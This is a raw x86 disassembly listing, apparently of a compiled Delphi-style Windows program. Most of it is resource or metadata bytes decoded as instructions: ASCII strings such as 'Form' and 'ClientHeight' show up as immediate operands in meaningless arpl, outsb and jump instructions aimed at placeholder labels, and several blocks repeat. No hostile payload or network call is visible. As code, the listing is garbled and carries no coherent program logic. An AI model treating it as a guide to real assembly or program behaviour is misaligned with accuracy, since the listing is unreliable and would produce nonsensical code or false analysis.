arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp al 0xa0
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
inc eax
mov al [ 0xc030044 ]
push esp
inc ebx
insb
outsd
jae r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
movsb [ edi ] [ esi ]
je r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
sahf
inc esp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
pushfd
outsd
mov [ eax + 0xb080044 ] ah
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] bh
inc eax
add [ eax ] bh
inc esp
add [ ebp - 0x5f33ffc0 ] cl
inc esp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
inc esp
add [ esi ] al
or al 0x54
jns r-xdata
popad
je r-xdata
jns r-xdata
lahf
inc esp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
nop
adc [ ecx + 0xe080044 ] ah
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
jae r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] bh
inc esi
outsd
jb r-xdata
sbb [ ebx - 0x33d7ffbc ] 0x41
add al cl
rol [ eax + eax + 0x7c ] 0x1
rol [ eax + eax - 0x58 ] cl
xor eax [ eax ]
call 0xfffffffffc44e6db
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add ah ah
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x5e0fffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
mov [ 0xffffffffa4880044 ] al
inc esp
add [ eax ] al
add cl [ eax ]
push es
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
adc [ eax + 0x6f ] esi
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
mov al [ 0x300449e ]
inc esi
outsd
jb r-xdata
insd
outsd
add [ eax ] al
hlt
jae r-xdata
cwde
inc ebx
inc ebx
add [ ebx + eax * 2 - 0x23c7ffbd ] bl
inc esp
add [ eax - 0x23ffbc8d ] bh
add [ esp + edx * 8 - 0x2b1fffbc ] ah
inc esp
add ah ch
aad 0x44
add ah dh
dec esi
inc ebx
add [ eax - 0x34 ] al
inc ecx
add [ esi + ebx * 8 + 0x44 ] ah
add [ eax ] ah
leave
inc ecx
add [ edx + ebx ] al
inc ebp
add [ edi + ecx * 8 ] bh
inc esp
add [ edi + edi * 4 ] dl
inc ebx
add [ eax ] dh
les eax [ ebx ]
jl r-xdata
int3
add [ eax ] ch
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ esi ] al
mov [ 0xffffffffa4760044 ] eax
inc esp
add al bh
add al [ eax ]
add [ eax + 0x2800449b ] al
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
jae r-xdata
lahf
inc esp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
rol [ eax + eax ] cl
inc ebx
add [ eax + 0x44 ] dl
inc ebx
add [ eax + 0x440043b9 ] dl
fild [ eax + eax - 0x38 ]
mov dh 0x43
add [ eax - 0x63ffbcbd ] bl
inc ebx
inc ebx
add [ eax ] bh
fadd [ eax + eax - 0x48 ]
jae r-xdata
jl r-xdata
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
dec esp
mov eax [ 0xa080044 ]
push esp
dec eax
insb
outsb
je r-xdata
outsb
je r-xdata
add [ eax ] ch
hlt
inc esp
dec esi
inc ebx
add [ eax * 2 + 0x50680043 ] dl
inc ebx
add [ esi + ebx * 8 ] ch
inc esp
add al bh
fadd [ eax + eax - 0x60 ]
push ecx
inc ebx
add [ esi + ebx * 8 + 0x743c0044 ] ah
inc ebx
add [ edi + esi * 4 ] bl
inc ebx
add al bl
mov bh 0x43
add ah dl
mov dl 0x43
add [ edi + esi * 4 - 0x31c3ffbd ] bh
inc esp
add [ eax - 0x1b ] cl
inc esp
add [ eax + 0xc00438d ] cl
inc esp
add [ ebp + esi * 8 + 0x44 ] ch
add ah bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xa2
inc esp
add [ eax + 0x44a4 ] cl
les eax [ ebx ]
push esp
fadd [ eax + eax - 0x44 ]
jo r-xdata
inc esp
add [ eax - 0x17ffbfcd ] ch
test [ eax + eax - 0x4 ] 0x30
inc eax
add [ eax ] bl
xor [ eax ] eax
in al 0xd2
inc esp
add [ eax ] al
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
push esp
mov al [ 0xb080044 ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_449cf8
inc esp
add [ eax + 0xd004318 ] ch
add [ 0x6d726f46 ] al
jae r-xdata
cdq
inc esp
add [ eax ] cl
add al [ eax ]
dec eax
leave
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ eax - 0x67 ] dl
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
or [ gs : edx + 0x73 ] ah
cdq
inc esp
add [ edx + eax ] cl
add bh bh
fmul st1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
invd
dec ecx
dec edi
insb
inc esi
add bh bh
dec [ ebx + 0x449e20c0 ]
add [ edi ] cl
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
insd
pop esp
adc [ eax ] eax
add ecx eax
loope r-xdata
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
popfd
inc esp
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
shl ecx 0x2
jb r-xdata
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
outsd
insb
popfd
inc esp
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
outsd
jb r-xdata
inc eax
add [ eax + 0x300449e ] ah
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
int 0xda
outsb
jne r-xdata
push ebx
je r-xdata
add eax 0x58000000
outsd
imul eax [ ebx + edx * 2 ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
inc eax
add ah ch
add [ ebx ] al
add [ eax ] al
add [ esi + ebx * 4 + 0x620c0044 ] bl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x63 ] bl
inc esp
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
push eax
outsd
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esi + ebx * 4 + 0x44 ] cl
add [ eax ] cl
jae r-xdata
dec [ ebp - 0x61afffc0 ]
add bh bh
inc esp
add [ ebx ] al
lea eax [ eax ]
push eax
sahf
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jb r-xdata
je r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ edi + ebx * 4 ] al
inc esp
add [ edx ] cl
jo r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
push cs
jo r-xdata
mov eax eax
inc esi
outsd
jb r-xdata
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc eax
add [ ecx ] al
jae r-xdata
popfd
inc esp
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
lea eax [ eax ]
in al dx
popfd
inc esp
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x58000000 ] al
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
jo r-xdata
jb r-xdata
outsb
insb
arpl [ edi + 0x6e ] bp
jae r-xdata
outsd
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov al [ 0x900449f ]
inc esp
popa
jne r-xdata
insb
jns r-xdata
jae r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
lahf
inc esp
add [ esi ] al
jo r-xdata
inc eax
add [ eax + 0x80044a0 ] cl
or edx [ ebx + eax * 2 + 0x6c ]
insd
lahf
inc esp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
sahf
inc esp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
pushfd
je r-xdata
je r-xdata
insd
inc esp
jae r-xdata
add [ eax ] al
add [ eax + 0x900449f ] ah
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
shl al 0x9e
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
movsb [ edi ] [ esi ]
je r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
outsd
mov [ eax + 0xb080044 ] ah
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jns r-xdata
lahf
inc esp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
nop
insd
popad
jb r-xdata
popad
dec ebp
inc esp
jae r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
je r-xdata
jo r-xdata
push cs
je r-xdata
popad
je r-xdata
inc esp
add [ esi ] al
or al 0x54
jns r-xdata
inc ebx
insb
push eax
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
nop
adc [ ecx + 0xe080044 ] ah
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
jb r-xdata
jb r-xdata
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax ] bh
inc esi
outsd
jb r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp al 0xa0
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
inc eax
mov al [ 0xc030044 ]
push esp
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
jo r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
outsd
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
jae r-xdata
jo r-xdata
sbb [ ebx - 0x33d7ffbc ] 0x41
add al cl
rol [ eax + eax + 0x7c ] 0x1
rol [ eax + eax - 0x58 ] cl
xor eax [ eax ]
call 0xfffffffffc44e6db
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add ah ah
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x5e0fffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
mov [ 0xffffffffa4880044 ] al
inc esp
add [ eax ] al
inc ebp
jbe r-xdata
add cl [ eax ]
push es
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
insd
outsd
add [ eax ] al
hlt
jae r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] bh
inc eax
add [ eax ] bh
inc esp
add [ ebp - 0x5f33ffc0 ] cl
inc esp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
mov al [ 0x300449e ]
inc esi
outsd
jb r-xdata
jb r-xdata
cwde
inc ebx
inc ebx
add [ ebx + eax * 2 - 0x23c7ffbd ] bl
inc esp
add [ eax - 0x23ffbc8d ] bh
add [ esp + edx * 8 - 0x2b1fffbc ] ah
inc esp
add ah ch
aad 0x44
add ah dh
dec esi
inc ebx
add [ eax - 0x34 ] al
inc ecx
add [ esi + ebx * 8 + 0x44 ] ah
add [ eax ] ah
leave
inc ecx
add [ edx + ebx ] al
inc ebp
add [ edi + ecx * 8 ] bh
inc esp
add [ edi + edi * 4 ] dl
inc ebx
add [ eax ] dh
les eax [ ebx ]
jl r-xdata
int3
add [ eax ] ch
pop es
dec ecx
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
popad
outsb
add [ eax ] al
jb r-xdata
outsd
outsd
insb
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jae r-xdata
lahf
inc esp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
rol [ eax + eax ] cl
inc ebx
add [ eax + 0x44 ] dl
inc ebx
add [ eax + 0x440043b9 ] dl
fild [ eax + eax - 0x38 ]
mov dh 0x43
add [ eax - 0x63ffbcbd ] bl
inc ebx
inc ebx
add [ eax ] bh
fadd [ eax + eax - 0x48 ]
jae r-xdata
jl r-xdata
jb r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
jbe r-xdata
jo r-xdata
inc ebp
jbe r-xdata
adc [ eax + 0x6f ] esi
outsb
je r-xdata
add [ eax ] ch
hlt
inc esp
dec esi
inc ebx
add [ eax * 2 + 0x50680043 ] dl
inc ebx
add [ esi + ebx * 8 ] ch
inc esp
add al bh
fadd [ eax + eax - 0x60 ]
push ecx
inc ebx
add [ esi + ebx * 8 + 0x743c0044 ] ah
inc ebx
add [ edi + esi * 4 ] bl
inc ebx
add al bl
mov bh 0x43
add ah dl
mov dl 0x43
add [ edi + esi * 4 - 0x31c3ffbd ] bh
inc esp
add [ eax - 0x1b ] cl
inc esp
add [ eax + 0xc00438d ] cl
inc esp
add [ ebp + esi * 8 + 0x44 ] ch
add ah bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xa2
inc esp
add [ eax + 0x44a4 ] cl
les eax [ ebx ]
push esp
fadd [ eax + eax - 0x44 ]
jo r-xdata
inc esp
add [ eax - 0x17ffbfcd ] ch
test [ eax + eax - 0x4 ] 0x30
inc eax
add [ eax ] bl
xor [ eax ] eax
in al 0xd2
inc esp
add [ eax ] al
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ esi ] al
mov [ 0xffffffffa4760044 ] eax
inc esp
add al bh
add al [ eax ]
add [ eax + 0x2800449b ] al
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
dec esp
mov eax [ 0xa080044 ]
push esp
dec eax
insb
outsb
je r-xdata
push esp
mov al [ 0xb080044 ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_44a292
inc esp
add [ eax ] ah
mov es [ ebx ]
and al 0x8e
inc ebx
add [ esi + esi * 8 - 0x737bffbc ] ah
inc ebx
add ah bh
mov eax 0xfd980043
inc esp
add [ edx + ecx * 8 ] bh
inc ebx
add [ eax - 0x4b ] bh
inc ebx
add [ edx + edx - 0x37cfffbb ] ch
inc esp
add al ah
0x44
sub_44a596
inc esp
add [ eax ] ah
mov es [ ebx ]
and al 0x8e
inc ebx
add [ esi + esi * 8 - 0x737bffbc ] ah
inc ebx
add ah bh
mov eax 0xfd980043
inc esp
add [ edx + ecx * 8 ] bh
inc ebx
add [ eax - 0x4b ] bh
inc ebx
add [ edx + edx - 0x37cfffbb ] ch
inc esp
add al ah
0x44
sub_44a5c4
mov [ ebx ] es
inc ebp
add al cl
rol [ eax + eax + 0x44 ] cl
aam 0x44
add [ esi + edx - 0x2effffbb ] cl
inc esp
add [ eax + 0x70004511 ] dl
clc
inc esp
add [ ebx + edx + 0x45 ] al
add [ eax ] ch
fiadd [ eax + eax + 0x5 ]
push esp
inc esi
outsd
jb r-xdata
add [ eax ] al
jmp [ eax ]
mov eax eax
hlt
sub_44a5fd
inc esp
add [ esp + 0x5e0044 ] al
add eax 0x6d726f46
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
jmp [ eax + 0x1b ]
add [ eax + 0x56 ] dh
inc ecx
add [ eax + eax ] bh
add dh bh
add [ ebx + eax * 2 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
test al 0x18
inc ebx
add [ eax ] ah
add al [ eax ]
dec [ edi + esi * 8 + 0x44 ]
add ah cl
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
outsd
outsb
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
je r-xdata
add bh bh
jmp r-xdata
popfd
inc esp
add [ ecx ] ch
add al [ eax ]
inc [ eax ]
out 0x44 eax
add ah cl
jmp r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
xor [ edx + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xec65646f
sahf
inc esp
add [ eax ] ch
add al [ eax ]
call esp
out 0x44 al
push esi
popad
insb
jne r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
fiadd [ eax + eax ]
inc ebx
add ah cl
add [ eax ] al
add [ eax ] 0x0
and ch bl
insb
inc eax
adc al 0x43
add [ ecx + eax ] ch
dec [ eax ]
mov edx 0x10043
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
pop eax
push es
inc ebx
add [ ecx ] ah
add bh bh
pushad
inc esp
inc ebx
add ah bh
inc esp
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
popad
outsb
mov ah 0xda
inc ecx
add [ eax ] dh
add bh bh
lodsb [ esi ]
push edx
inc ebx
add al cl
push edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
jb r-xdata
add ah cl
jmp r-xdata
aam 0xe6
inc esp
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
dec [ ecx + ecx * 8 - 0x254fffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
call 0xffffffff9d43a85e
sbb eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
inc esp
add [ eax - 0x26 ] bh
inc esp
add [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
or al 0x51
inc ebx
add [ ecx + edx * 2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
and [ eax ] eax
push cs
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
inc ebx
lahf
inc esp
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
dec esp
jmp r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x7cff0001 ] ah
mov ebx 0x10043
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
sub [ edx - 0x45b3ffbd ] bh
outsb
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
les esp [ ebx + eax * 2 + 0x100 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
mov ah 0x5
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
popad
insb
jne r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
insb
outsd
jb r-xdata
add eax [ eax ]
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x28ff0001 ] ah
mov edx 0xba4c0043
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ edi ] al
inc ebx
add [ eax + eax ] dh
call esp
jne r-xdata
jae r-xdata
fiadd [ ecx ]
in al dx
add al [ eax ]
dec [ eax + 0x100451b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
jl r-xdata
add [ ecx ] al
add [ eax ] al
add eax 0x5d0043
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_44abd9
inc esp
add ah cl
jmp r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
